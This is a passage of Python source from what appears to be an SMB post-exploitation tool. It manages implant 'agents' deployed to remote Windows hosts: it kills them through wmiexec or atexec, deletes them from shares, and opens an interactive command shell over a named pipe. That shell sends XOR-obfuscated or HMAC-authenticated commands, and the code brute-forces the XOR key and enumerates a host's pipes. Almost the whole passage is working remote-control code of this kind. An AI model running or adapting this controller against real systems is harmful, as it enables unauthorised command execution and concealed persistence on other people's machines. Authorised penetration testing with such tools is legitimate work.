                        # Connect to the original deployment share if needed
                        if (
                            not self.is_connected_to_share
                            or self.share.upper() != agent_share.upper()
                        ):
                            print_debug(f"Switching to share: {agent_share}")
                            self.tid = self.conn.connectTree(agent_share)
                            self.share = agent_share
                            self.is_connected_to_share = True

                        self.conn.deleteFile(self.share, relative_path)
                        print_good(f"Successfully deleted agent file: {agent_path}")
                        deletion_success = True
                    except Exception as smb_error:
                        error_msg = str(smb_error)

                        # Check if deletion failed because file is locked (process is running)
                        if (
                            "STATUS_CANNOT_DELETE" in error_msg
                            or "STATUS_SHARING_VIOLATION" in error_msg
                        ):
                            print_warning(f"Cannot delete - agent process is still running")
                            print_info(
                                f"Use 'agent kill {args.agent_id}' first, then retry 'agent rm'"
                            )
                        else:
                            print_warning(f"Failed to delete file via SMB: {smb_error}")

                        print_debug(f"SMB deletion error: {smb_error}")
                        deletion_success = False

                # Update agent status and disk presence
                if deletion_success:
                    agents[args.agent_id]["status"] = "deleted"
                    agents[args.agent_id]["on_disk"] = "Deleted"
                    print_good(f"Agent '{args.agent_id}' status updated to 'deleted'")
                else:
                    print_warning(f"File deletion failed, but agent can be manually removed")
                    print_info(f"Agent '{args.agent_id}' remains in registry for manual cleanup")

                # Save registry
                with open(registry_file, "w") as f:
                    json.dump(agents, f, indent=2)

            except Exception as e:
                print_bad(f"Failed to delete agent file: {e}")
                print_debug(f"Exception details: {e}")

        except Exception as e:
            print_bad(f"Failed to remove agent: {e}")

    def agent_reset_handler(self, args):
        """Kill and remove all deployed agents"""
        try:
            from slingerpkg.utils.printlib import print_info, print_good, print_bad, print_warning

            # Ensure connected to a share for SMB operations
            if not self.is_connected_to_share:
                print_bad("Not connected to a share. Use 'use <share>' first.")
                print_info("Example: use C$")
                return

            # Load agent registry
            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"

            if not registry_file.exists():
                print_bad("No deployed agents found")
                return

            with open(registry_file, "r") as f:
                agents = json.load(f)

            if not agents:
                print_info("No agents to reset")
                return

            agent_ids = list(agents.keys())
            print_info(f"Resetting {len(agent_ids)} agent(s)...")

            # Get method and atexec options from args
            method = getattr(args, "method", "wmiexec")

            # Create a mock args object for kill and rm commands that includes atexec options
            class MockArgs:
                def __init__(self, agent_id, parent_args):
                    self.agent_id = agent_id
                    self.method = getattr(parent_args, "method", "wmiexec")
                    # Pass through atexec options
                    self.ta = getattr(parent_args, "ta", None)
                    self.td = getattr(parent_args, "td", None)
                    self.tf = getattr(parent_args, "tf", None)
                    self.sp = getattr(parent_args, "sp", None)
                    self.sn = getattr(parent_args, "sn", None)
                    self.sh = getattr(parent_args, "sh", None)
                    self.wait = getattr(parent_args, "wait", None)

            print_info(f"Using {method} method for kill operations")

            for agent_id in agent_ids:
                print_info(f"\n[*] Processing agent: {agent_id}")

                # Try to kill the agent process
                try:
                    print_info(f"  Attempting to kill agent process...")
                    mock_args = MockArgs(agent_id, args)
                    self.agent_kill_handler(mock_args)
                except Exception as e:
                    print_warning(f"  Kill failed (agent may not be running): {e}")

                # Try to remove the agent file
                try:
                    print_info(f"  Attempting to remove agent file...")
                    mock_args = MockArgs(agent_id, args)
                    self.agent_rm_handler(mock_args)
                except Exception as e:
                    print_warning(f"  Remove failed: {e}")

            print_good(f"\n✓ Reset complete - processed {len(agent_ids)} agent(s)")

        except Exception as e:
            print_bad(f"Failed to reset agents: {e}")

    def agent_update_handler(self, args):
        """Handle agent path update in registry"""
        try:
            from slingerpkg.utils.printlib import print_info, print_good, print_bad, print_warning

            # Load agent registry
            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"

            if not registry_file.exists():
                print_bad("No deployed agents found")
                return

            with open(registry_file, "r") as f:
                agents = json.load(f)

            # Check if agent exists
            if args.agent_id not in agents:
                print_bad(f"Agent '{args.agent_id}' not found in registry")
                return

            agent_info = agents[args.agent_id]
            old_path = agent_info.get("path", "Unknown")

            print_info(f"Updating agent '{args.agent_id}' path:")
            print_info(f"  Old path: {old_path}")
            print_info(f"  New path: {args.path}")

            # Update the path
            agents[args.agent_id]["path"] = args.path

            # Save registry
            with open(registry_file, "w") as f:
                json.dump(agents, f, indent=2)

            print_good(f"Agent '{args.agent_id}' path updated successfully")

        except Exception as e:
            print_bad(f"Failed to update agent: {e}")

    def _show_built_agents_status(self, output_dir):
        """Show built agents and their deployment status"""
        try:
            from tabulate import tabulate
            from slingerpkg.utils.printlib import print_info, print_log, print_warning, print_debug

            output_path = Path(output_dir)

            if not output_path.exists():
                print_info("\nBuilt Agents: None")
                return

            # Find all .exe files in output directory
            agent_files = list(output_path.glob("*.exe"))

            if not agent_files:
                print_info("\nBuilt Agents: None")
                print_log("  Use 'agent build' to build agents")
                return

            # Load deployment registry
            registry = self._load_agent_registry()

            print_info("\nBuilt Agents:")

            # Prepare table data
            headers = ["Agent File", "Architecture", "Size", "Status", "Deployed To", "Agent ID"]
            table_data = []

            for agent_file in sorted(agent_files):
                # Extract info from filename (e.g., slinger_agent_x64_12345.exe)
                filename = agent_file.name

                # Parse architecture from filename
                if "_x64_" in filename:
                    arch = "x64"
                elif "_x86_" in filename:
                    arch = "x86"
                else:
                    arch = "Unknown"

                # Get file size
                try:
                    size = self.sizeof_fmt(agent_file.stat().st_size)
                except:
                    size = "Unknown"

                # Check deployment status
                deployed_info = self._find_deployed_agent_by_file(registry, filename)

                if deployed_info:
                    status = "Deployed"
                    deployed_to = f"{deployed_info['host']}:{deployed_info['path']}"
                    agent_id = deployed_info["id"]
                else:
                    status = "Not Deployed"
                    deployed_to = "-"
                    agent_id = "-"

                table_data.append([filename, arch, size, status, deployed_to, agent_id])

            print_log(tabulate(table_data, headers=headers, tablefmt="simple"))

            # Show summary
            deployed_count = sum(1 for row in table_data if row[3] == "Deployed")
            total_count = len(table_data)

            print_log(f"\nSummary: {total_count} built, {deployed_count} deployed")

            if deployed_count > 0:
                print_log("Use 'agent list' to see detailed deployment info")
                print_log("Use 'agent use <id>' to interact with deployed agents")

        except Exception as e:
            print_warning(f"Failed to show agent status: {e}")
            print_debug(f"Exception details: {e}")

    def _find_deployed_agent_by_file(self, registry, filename):
        """Find deployed agent info by matching filename patterns"""
        try:
            # Extract base name without .exe
            base_name = filename.replace(".exe", "")

            # Look for agents that might match this file
            for agent_id, info in registry.items():
                agent_name = info.get("name", "")

                # Check if the agent name matches or contains similar patterns
                if agent_name == filename:
                    return info

                # Also check if the agent ID is contained in the filename
                if agent_id in base_name:
                    return info

            return None

        except Exception:
            return None

    @staticmethod
    def _xor_decode(data, key):
        """XOR decode data with the given key (symmetric operation)"""
        if key is None:
            return data
        if isinstance(data, str):
            data = data.encode("utf-8")
        result = bytearray(data)
        for i in range(len(result)):
            result[i] ^= key
        return bytes(result)

    def _send_pipe_message(self, message_type, data, xor_key=None):
        """Send a structured message to the agent via SMB pipe"""
        try:
            import struct

            print_debug(
                f"_send_pipe_message called: type={hex(message_type)}, data={data[:50] if isinstance(data, (str, bytes)) else data}"
            )

            # Message format: [length:4][type:4][data:N]
            # All integers are little-endian
            data_bytes = data if isinstance(data, bytes) else data.encode("utf-8")

            # XOR encode the data if key is provided (agent expects encoded commands)
            if xor_key is not None:
                data_bytes = self._xor_decode(data_bytes, xor_key)  # XOR is symmetric
                print_debug(f"Data XOR-encoded with key: {xor_key}")

            length = len(data_bytes)
            print_debug(f"Message packed: length={length}, type={hex(message_type)}")

            # Pack header: length and type as little-endian 32-bit integers
            header = struct.pack("<II", length, message_type)
            full_message = header + data_bytes
            print_debug(f"Full message size: {len(full_message)} bytes")

            # Write to the pipe using SMB
            print_debug(f"Calling writeFile: tid={self.agent_pipe_tid}, fid={self.agent_pipe_fid}")
            print_debug(f"Message hex (first 50 bytes): {full_message[:50].hex()}")
            bytes_written = self.conn.writeFile(
                self.agent_pipe_tid, self.agent_pipe_fid, full_message, 0  # offset
            )
            print_debug(f"writeFile returned: {bytes_written} (expected {len(full_message)})")

            return True

        except Exception as e:
            print_debug(f"Failed to send pipe message: {e}")
            print_debug(f"Traceback: {traceback.format_exc()}")
            return False

    def _receive_pipe_message(self):
        """Receive a structured message from the agent via SMB pipe"""
        try:
            import struct

            # Read header (8 bytes: length + type as little-endian)
            header_data = self.conn.readFile(
                self.agent_pipe_tid, self.agent_pipe_fid, 0, 8  # offset  # bytesToRead
            )
            print_debug(
                f"Read header: {len(header_data) if header_data else 0} bytes, hex: {header_data.hex() if header_data else 'None'}"
            )

            if not header_data or len(header_data) != 8:
                print_debug("Failed to read full header")
                return None, None

            # Unpack as little-endian 32-bit integers
            length, msg_type = struct.unpack("<II", header_data)

            # Read message data (raw bytes)
            if length > 0:
                data = self.conn.readFile(
                    self.agent_pipe_tid, self.agent_pipe_fid, 0, length  # offset  # bytesToRead
                )

                if not data or len(data) != length:
                    return None, None

                # Return raw bytes - caller decides how to decode
                return msg_type, data
            else:
                return msg_type, b""

        except Exception as e:
            print_debug(f"Failed to receive pipe message: {e}")
            return None, None

    def _start_agent_shell(self, agent_info, timeout, no_colors=False):
        """Start interactive shell with agent via named pipe using custom protocol"""
        try:
            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_warning,
                print_log,
            )
            from slingerpkg.lib.named_pipe_client import NamedPipeClientWin32, NamedPipeClientCtypes
            import time

            # Use the known pipe name from the registry
            pipe_name = agent_info["pipe_name"]
            print_info(f"Connecting to pipe: \\\\{agent_info['host']}\\pipe\\{pipe_name}")

            try:
                # Named pipes MUST be accessed through IPC$ share
                pipe_path = f"\\{pipe_name}"

                # Save current share state to restore later
                saved_share = self.share if hasattr(self, "share") else None
                saved_tid = self.tid if hasattr(self, "tid") else None

                # Connect to IPC$ share for named pipe access
                self.agent_pipe_tid = self.conn.connectTree("IPC$")

                # Open the pipe through SMB using correct impacket API
                self.agent_pipe_fid = self.conn.openFile(
                    self.agent_pipe_tid,
                    pipe_path,
                    desiredAccess=0x12019F,  # GENERIC_READ | GENERIC_WRITE
                    shareMode=0x7,  # FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE
                    creationOption=0x00000040,  # FILE_NON_DIRECTORY_FILE
                    creationDisposition=0x00000001,  # FILE_OPEN
                    fileAttributes=0x00000080,  # FILE_ATTRIBUTE_NORMAL
                )

                print_good("Connected to agent pipe")
                print_debug(f"Connected to pipe: {pipe_name}")

                # Perform authentication if enabled
                auth = None
                if agent_info.get("auth_enabled"):
                    from slingerpkg.lib.agent_crypto import AgentAuthProtocol

                    passphrase = agent_info.get("passphrase")
                    if not passphrase:
                        print_bad(
                            "✗ Agent requires authentication but no passphrase found in registry"
                        )
                        return

                    print_info("🔐 Performing passphrase authentication...")
                    auth = AgentAuthProtocol()

                    # CRITICAL: Agent sends initial ACK handshake message after connection
                    # We must consume this 8-byte header (length + type) + ACK message BEFORE reading auth nonce
                    # Use readFile (not readNamedPipe) for consistent buffering behavior across reconnections
                    print_debug("Consuming initial ACK handshake from agent...")
                    header_data = self.conn.readFile(self.agent_pipe_tid, self.agent_pipe_fid, 0, 8)
                    if len(header_data) != 8:
                        print_bad(
                            f"✗ Failed to receive message header (got {len(header_data)} bytes)"
                        )
                        return

                    # Parse message header: 4 bytes length + 4 bytes type (both little-endian)
                    # Wire format: {uint32_t length, uint32_t type}
                    msg_length = struct.unpack("<I", bytes(header_data[0:4]))[0]
                    msg_type = struct.unpack("<I", bytes(header_data[4:8]))[0]
                    print_debug(f"Initial handshake: type={msg_type}, length={msg_length}")

                    # Read and discard the ACK message body
                    if msg_length > 0:
                        ack_body = self.conn.readFile(
                            self.agent_pipe_tid, self.agent_pipe_fid, 0, msg_length
                        )
                        if len(ack_body) != msg_length:
                            print_bad(
                                f"✗ Failed to receive ACK body (got {len(ack_body)} bytes, expected {msg_length})"
                            )
                            return
                        print_debug(f"Received ACK handshake: {bytes(ack_body)}")

                    # Step 1: NOW receive 16-byte nonce from agent (raw bytes, not XOR-encoded)
                    print_debug("Waiting for authentication challenge from agent...")
                    nonce_data = self.conn.readFile(self.agent_pipe_tid, self.agent_pipe_fid, 0, 16)
                    if len(nonce_data) != 16:
                        print_bad(
                            f"✗ Failed to receive nonce (got {len(nonce_data)} bytes, expected 16)"
                        )
                        return

                    nonce = bytes(nonce_data)
                    print_debug(f"Received 16-byte nonce from agent: {nonce.hex()}")

                    # Step 2: Handle challenge - compute HMAC and derive session key
                    hmac_response, session_key = auth.handle_challenge(nonce, passphrase)

                    # Step 3: Initialize the session with the derived key
                    auth.initialize_session(session_key)

                    # Step 4: Send HMAC response to agent (32 bytes, not XOR-encoded)
                    print_debug("Sending HMAC response to agent...")
                    self.conn.writeFile(self.agent_pipe_tid, self.agent_pipe_fid, hmac_response, 0)
                    print_debug(f"Sent HMAC response: {hmac_response.hex()}")

                    print_good("✓ Authentication successful - all communications encrypted")

                    # NOTE: After successful authentication, agent goes directly to command loop
                    # No ACK message is sent - agent is ready to receive commands immediately

                else:
                    # No authentication - consume XOR-encoded ACK handshake
                    print_debug("Consuming ACK handshake (XOR mode)...")
                    xor_key = agent_info.get("xor_key")
                    msg_type, response_data = self._receive_pipe_message()
                    if msg_type == 0x1002:  # Response type
                        decoded_data = self._xor_decode(response_data, xor_key)
                        ack_msg = decoded_data.decode("utf-8", errors="replace").strip()
                        print_debug(f"Received XOR-encoded ACK: {ack_msg}")

                        # Validate ACK message - if not "ACK", there's likely an XOR key mismatch
                        if ack_msg != "ACK":
                            print_warning("XOR key mismatch detected!")
                            print_warning(f"Expected 'ACK' but got: {repr(ack_msg[:50])}")
                            print_info(
                                "This usually means an older agent process is still running."
                            )
                            print_info(
                                "Try: 1) Kill old agent processes on target, 2) Re-deploy with unique pipe name"
                            )

                            # Try to auto-detect correct XOR key
                            for test_key in range(256):
                                test_decoded = self._xor_decode(response_data, test_key)
                                test_msg = test_decoded.decode("utf-8", errors="replace").strip()
                                if test_msg == "ACK":
                                    print_info(
                                        f"Detected actual XOR key: {test_key} (expected: {xor_key})"
                                    )
                                    print_info("Updating agent info with detected key...")
                                    agent_info["xor_key"] = test_key
                                    self._save_agent_info(agent_info)
                                    print_good(f"Agent XOR key corrected to {test_key}")
                                    break
                    else:
                        print_warning(f"Unexpected message type: 0x{msg_type:04x}")

                # Start interactive shell
                self._run_pipe_interactive_shell(agent_info, auth, no_colors=no_colors)

            except Exception as e:
                print_bad(f"Failed to connect to agent: {e}")
                print_debug(f"Pipe connection error: {e}")
                print_info("Make sure the agent is running and accessible")
                # Clean up pipe handle if we opened it
                if hasattr(self, "agent_pipe_fid") and hasattr(self, "agent_pipe_tid"):
                    try:
                        print_debug("Cleaning up pipe handle after error")
                        self.conn.closeFile(self.agent_pipe_tid, self.agent_pipe_fid)
                        print_debug("Disconnecting from IPC$ tree after error")
                        self.conn.disconnectTree(self.agent_pipe_tid)
                        delattr(self, "agent_pipe_fid")
                        delattr(self, "agent_pipe_tid")
                    except Exception as cleanup_err:
                        print_debug(f"Cleanup error (non-fatal): {cleanup_err}")
                return

        except Exception as e:
            print_bad(f"Failed to start agent shell: {e}")
            print_debug(f"Exception details: {e}")
            # Clean up pipe handle if we opened it
            if hasattr(self, "agent_pipe_fid") and hasattr(self, "agent_pipe_tid"):
                try:
                    self.conn.closeFile(self.agent_pipe_tid, self.agent_pipe_fid)
                except:
                    pass

    def _run_pipe_interactive_shell(self, agent_info, auth=None, no_colors=False):
        """Run interactive shell using custom pipe protocol

        Args:
            agent_info: Agent configuration dictionary
            auth: Optional AgentAuthProtocol instance for encrypted communication
            no_colors: Disable colored prompt
        """
        try:
            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_warning,
                print_log,
            )

            print_info("╔══════════════════════════════════════════╗")
            print_info("║        AGENT INTERACTIVE SHELL           ║")
            print_info("╚══════════════════════════════════════════╝")
            print_log(f"Agent ID: {agent_info['id']}")
            print_log(f"Host: {agent_info['host']}")
            print_log(f"Pipe: {agent_info['pipe_name']}")
            print_log("")
            print_info("Type 'exit' to close the connection")
            print_info("Type 'help' for agent commands")
            print_log("")

            # Setup prompt_toolkit session with command history
            from prompt_toolkit import PromptSession, HTML
            from prompt_toolkit.history import FileHistory
            from prompt_toolkit.auto_suggest import AutoSuggestFromHistory

            history_file = Path.home() / ".slinger" / "agent_history.txt"
            history_file.parent.mkdir(parents=True, exist_ok=True)

            session = PromptSession(
                history=FileHistory(str(history_file)),
                auto_suggest=AutoSuggestFromHistory(),
            )

            # Track current working directory
            current_dir = "C:\\"

            try:
                while True:
                    try:
                        # Show agent ID above prompt, directory as part of prompt line
                        if no_colors:
                            print(f"agent:{agent_info['id']}:")
                            prompt_text = f"{current_dir}> "
                        else:
                            print_log(f"agent:{agent_info['id']}:")
                            prompt_text = HTML(
                                f"<ansigreen>{current_dir}</ansigreen><ansiblue>> </ansiblue>"
                            )
                        command = session.prompt(prompt_text).strip()

                        if not command:
                            continue

                        if command.lower() in ["exit", "quit"]:
                            print_info("Closing agent connection...")
                            break

                        if command.lower() == "help":
                            print_info("Available commands:")
                            print_log("  help        - Show this help")
                            print_log(
                                "  exit/quit   - Close connection (reconnect to refresh session keys)"
                            )
                            print_log("  <command>   - Execute any Windows command on agent")
                            continue

                        # Track directory changes
                        if command.lower().startswith("cd "):
                            # Will update after getting response
                            pass

                        # Send command to agent via pipe (message type 0x1001 = command)
                        if auth and auth.is_authenticated():
                            # Encrypted mode - encrypt command without XOR encoding
                            encrypted_cmd = auth.encrypt_message(command)
                            if not self._send_pipe_message(0x1001, encrypted_cmd, xor_key=None):
                                print_bad("Failed to send encrypted command to agent")
                                continue
                        else:
                            # XOR mode - encode the command before sending
                            xor_key = agent_info.get("xor_key")
                            if not self._send_pipe_message(0x1001, command, xor_key):
                                print_bad("Failed to send command to agent")
                                continue

                        # Receive response from agent
                        msg_type, response_data = self._receive_pipe_message()

                        if msg_type is None:
                            print_warning("No response from agent")
                        elif msg_type == 0x1002:  # Response message type
                            if auth and auth.is_authenticated():
                                # Encrypted response - decrypt without XOR decoding
                                response_str = response_data.decode("utf-8", errors="replace")
                                print_debug(
                                    f"Received encrypted response ({len(response_data)} bytes)"
                                )
                                print_debug(f"Raw response_data (hex): {response_data.hex()}")
                                print_debug(
                                    f"Response string (first 100 chars): {response_str[:100]}"
                                )
                                response = auth.decrypt_message(response_str)
                                if response is None:
                                    print_bad("Failed to decrypt response")
                                    print_debug(f"Full response_data (hex): {response_data.hex()}")
                                    print_debug(f"Full response_str: {response_str}")
                                    continue
                            else:
                                # XOR-encoded response
                                xor_key = agent_info.get("xor_key")
                                decoded_data = self._xor_decode(response_data, xor_key)
                                response = decoded_data.decode("utf-8", errors="replace")

                            # Filter out "Current directory:" lines from output (only for prompt display)
                            # Agent returns "[*] Current directory: ..." format
                            resp_stripped = response.strip()
                            if not (
                                resp_stripped.startswith("Current directory:")
                                or resp_stripped.startswith("[*] Current directory:")
                            ):
                                print_log(response)

                            # Update current directory if cd command was successful
                            if command.lower().startswith("cd "):
                                # Send 'cd' (no args) to get current directory
                                pwd_command = "cd"
                                if auth and auth.is_authenticated():
                                    pwd_encrypted = auth.encrypt_message(pwd_command)
                                    if self._send_pipe_message(0x1001, pwd_encrypted, xor_key=None):
                                        msg_type, pwd_data = self._receive_pipe_message()
                                        if msg_type == 0x1002:
                                            pwd_str = pwd_data.decode("utf-8", errors="replace")
                                            new_dir = auth.decrypt_message(pwd_str)
                                            if new_dir:
                                                # Strip "[*] Current directory: " prefix if present
                                                new_dir_stripped = new_dir.strip()
                                                if new_dir_stripped.startswith(
                                                    "[*] Current directory:"
                                                ):
                                                    current_dir = new_dir_stripped.replace(
                                                        "[*] Current directory:", ""
                                                    ).strip()
                                                elif new_dir_stripped.startswith(
                                                    "Current directory:"
                                                ):
                                                    current_dir = new_dir_stripped.replace(
                                                        "Current directory:", ""
                                                    ).strip()
                                                else:
                                                    current_dir = new_dir_stripped
                                else:
                                    xor_key = agent_info.get("xor_key")
                                    if self._send_pipe_message(0x1001, pwd_command, xor_key):
                                        msg_type, pwd_data = self._receive_pipe_message()
                                        if msg_type == 0x1002:
                                            decoded = self._xor_decode(pwd_data, xor_key)
                                            new_dir = decoded.decode(
                                                "utf-8", errors="replace"
                                            ).strip()
                                            # Strip "[*] Current directory: " prefix if present
                                            if new_dir.startswith("[*] Current directory:"):
                                                current_dir = new_dir.replace(
                                                    "[*] Current directory:", ""
                                                ).strip()
                                            elif new_dir.startswith("Current directory:"):
                                                current_dir = new_dir.replace(
                                                    "Current directory:", ""
                                                ).strip()
                                            else:
                                                current_dir = new_dir
                        else:
                            print_warning(f"Unexpected message type: 0x{msg_type:04x}")

                    except KeyboardInterrupt:
                        print_info("\nCtrl+C detected - closing agent connection...")
                        break

                    except EOFError:
                        print_info("\nEOF detected - closing agent connection...")
                        break

            finally:
                # Clean up pipe connection - close and wait for agent to detect disconnect
                try:
                    if hasattr(self, "agent_pipe_fid") and hasattr(self, "agent_pipe_tid"):
                        print_debug("Closing pipe file handle")
                        # CRITICAL: Close the file handle first
                        self.conn.closeFile(self.agent_pipe_tid, self.agent_pipe_fid)

                        # Give agent time to detect disconnect and reset pipe state
                        # Without this delay, immediate reconnections can hit stale pipe buffers
                        print_debug("Waiting for agent to detect disconnect...")
                        import time

                        time.sleep(0.5)  # 500ms delay allows agent's PeekNamedPipe to fail cleanly

                        # Don't disconnect IPC$ tree - it can stay connected
                        # Disconnecting may corrupt the SMB connection state
                        # Clear the handles
                        delattr(self, "agent_pipe_fid")
                        delattr(self, "agent_pipe_tid")

                    # Clear cached WMI connections since pipe operations may have affected them
                    if hasattr(self, "_wmi_services"):
                        print_debug("Clearing cached WMI connections after pipe operation")
                        self._wmi_services.clear()

                except Exception as cleanup_err:
                    print_debug(f"Pipe cleanup error: {cleanup_err}")

                print_info("Agent connection closed")

        except Exception as e:
            print_bad(f"Interactive shell error: {e}")
            print_debug(f"Exception details: {e}")

    def _discover_agent_pipe_name(self, agent_id):
        """Discover actual agent pipe name by scanning IPC$ share"""
        try:
            from slingerpkg.utils.printlib import print_debug

            # Temporarily switch to IPC$ to scan for pipes
            current_share = self.share
            self.conn.connectTree("IPC$")
            self.share = "IPC$"

            try:
                # List IPC$ contents to find pipe names
                files = self.conn.listPath("IPC$", "\\")

                for file_info in files:
                    filename = file_info.get_longname()
                    # Look for slinger related pipes (including custom pipe names)
                    if "slinger" in filename.lower():
                        pipe_name = filename
                        print_debug(f"Found agent pipe: {pipe_name}")
                        return pipe_name

            finally:
                # Restore original share
                if current_share != "IPC$":
                    self.conn.connectTree(current_share)
                    self.share = current_share

            return None

        except Exception as e:
            print_debug(f"Pipe discovery failed: {e}")
            return None

    def _update_agent_pipe_name(self, agent_id, new_pipe_name):
        """Update agent registry with discovered pipe name"""
        try:

            registry_path = Path.home() / ".slinger" / "agents" / "deployed_agents.json"

            if registry_path.exists():
                with open(registry_path, "r") as f:
                    registry = json.load(f)

                if agent_id in registry:
                    registry[agent_id]["pipe_name"] = new_pipe_name

                    with open(registry_path, "w") as f:
                        json.dump(registry, f, indent=2)

        except Exception as e:
            print_debug(f"Failed to update registry: {e}")

    def _extract_encryption_seed_from_filename(self, filename):
        """Extract encryption seed from agent filename pattern: slinger_agent_x64_12345.exe"""
        try:
            import re

            # Pattern: slinger_agent_{arch}_{seed}.exe
            pattern = r"slinger_agent_(?:x64|x86)_(\d+)\.exe"
            match = re.search(pattern, filename)

            if match:
                return match.group(1)

            return None

        except Exception:
            return None

    def _lookup_build_registry(self, agent_path):
        """Look up agent information from build registry"""
        try:

            registry_path = Path.home() / ".slinger" / "builds" / "built_agents.json"
            if not registry_path.exists():
                return None

            with open(registry_path, "r") as f:
                registry = json.load(f)

            # Look up by absolute path
            abs_path = str(Path(agent_path).resolve())
            return registry.get(abs_path)

        except Exception:
            return None

    def _delete_agent_from_registry(self, agent_id):
        """Delete agent from registry by ID"""
        try:
            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_warning,
                print_log,
            )

            registry_path = Path.home() / ".slinger" / "agents" / "deployed_agents.json"

            if not registry_path.exists():
                print_bad("No agent registry found")
                return

            # Load current registry
            with open(registry_path, "r") as f:
                registry = json.load(f)

            # Check if agent exists
            if agent_id not in registry:
                print_bad(f"Agent '{agent_id}' not found in registry")
                print_info("Use 'agent list' to see available agents")
                return

            # Get agent info for confirmation
            agent_info = registry[agent_id]
            print_info(f"Agent to delete:")
            print_log(f"  ID: {agent_info['id']}")
            print_log(f"  Host: {agent_info['host']}")
            print_log(f"  Name: {agent_info['name']}")
            print_log(f"  Path: {agent_info['path']}")
            if agent_info.get("process_id"):
                print_log(f"  PID: {agent_info['process_id']}")

            # Confirm deletion
            try:
                confirm = (
                    input(f"\nDelete agent '{agent_id}' from registry? [y/N]: ").strip().lower()
                )
                if confirm not in ["y", "yes"]:
                    print_info("Deletion cancelled")
                    return
            except (KeyboardInterrupt, EOFError):
                print_info("\nDeletion cancelled")
                return

            # Remove agent from registry
            del registry[agent_id]

            # Save updated registry
            with open(registry_path, "w") as f:
                json.dump(registry, f, indent=2)

            print_good(f"✓ Agent '{agent_id}' removed from registry")
            print_warning("Note: This only removes the registry entry.")
            print_warning("The actual agent process may still be running.")
            if agent_info.get("process_id"):
                print_info(f"To kill the process, use: taskkill /F /PID {agent_info['process_id']}")

        except Exception as e:
            print_bad(f"Failed to delete agent: {e}")

    def _delete_all_agents_from_registry(self):
        """Delete all agents from registry"""
        try:
            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_warning,
                print_log,
            )

            registry_path = Path.home() / ".slinger" / "agents" / "deployed_agents.json"

            if not registry_path.exists():
                print_bad("No agent registry found")
                return

            # Load current registry
            with open(registry_path, "r") as f:
                registry = json.load(f)

            # Check if registry is empty
            if not registry:
                print_info("No agents in registry")
                return

            # Display all agents
            print_info(f"Agents to delete ({len(registry)} total):")

            headers = ["Agent ID", "Host", "Agent Name", "Path", "PID"]
            table_data = []

            for agent_id, agent_info in registry.items():
                table_data.append(
                    [
                        agent_info["id"],
                        agent_info["host"],
                        agent_info["name"],
                        agent_info["path"],
                        agent_info.get("process_id", "Unknown"),
                    ]
                )

            print_log(tabulate(table_data, headers=headers, tablefmt="grid"))

            # Confirm deletion
            try:
                confirm = (
                    input(f"\nDelete ALL {len(registry)} agents from registry? [y/N]: ")
                    .strip()
                    .lower()
                )
                if confirm not in ["y", "yes"]:
                    print_info("Deletion cancelled")
                    return
            except (KeyboardInterrupt, EOFError):
                print_info("\nDeletion cancelled")
                return

            # Clear the registry
            with open(registry_path, "w") as f:
                json.dump({}, f, indent=2)

            print_good(f"✓ All {len(registry)} agents removed from registry")
            print_warning("Note: This only removes the registry entries.")
            print_warning("The actual agent processes may still be running.")

        except Exception as e:
            print_bad(f"Failed to delete all agents: {e}")

    def sizeof_fmt(self, num, suffix="B"):
        """Format file size in human readable format"""
        for unit in ["", "Ki", "Mi", "Gi", "Ti", "Pi", "Ei", "Zi"]:
            if abs(num) < 1024.0:
                return f"{num:3.1f}{unit}{suffix}"
            num /= 1024.0
        return f"{num:.1f}Yi{suffix}"

    def enumerate_named_pipes(self, args):
        """Enumerate named pipes on the remote system"""
        try:
            if not self.is_logged_in:
                print_bad("Not logged in. Please authenticate first.")
                return

            if not self.conn:
                print_bad("No SMB connection available.")
                return

            # Get verbose setting from args or current debug state
            verbose = getattr(args, "verbose", False) or getattr(self, "debug", False)

            print_info(f"Enumerating named pipes on {self.host}...")
            if verbose:
                print_debug(f"Using enumeration method: {args.method}")
                if hasattr(self, "share") and self.share:
                    print_debug(f"Current share: {self.share} (will be preserved)")

            # Create enumerator with current SMB connection
            enumerator = NamedPipeEnumerator(self.conn, verbose=verbose)

            # Enumerate pipes using specified method
            pipes = enumerator.enumerate_pipes(method=args.method)

            if pipes:
                # Display results
                output = enumerator.format_output(detailed=args.detailed)
                print(output)

                # Save to file if requested
                if args.output:
                    if enumerator.save_output(args.output, detailed=args.detailed):
                        print_good(f"Results saved to: {args.output}")
                    else:
                        print_bad(f"Failed to save results to: {args.output}")

            else:
                print_warning("No named pipes discovered.")

        except Exception as e:
            print_debug(f"Error enumerating named pipes: {e}", sys.exc_info())
            print_bad(f"Failed to enumerate named pipes: {e}")
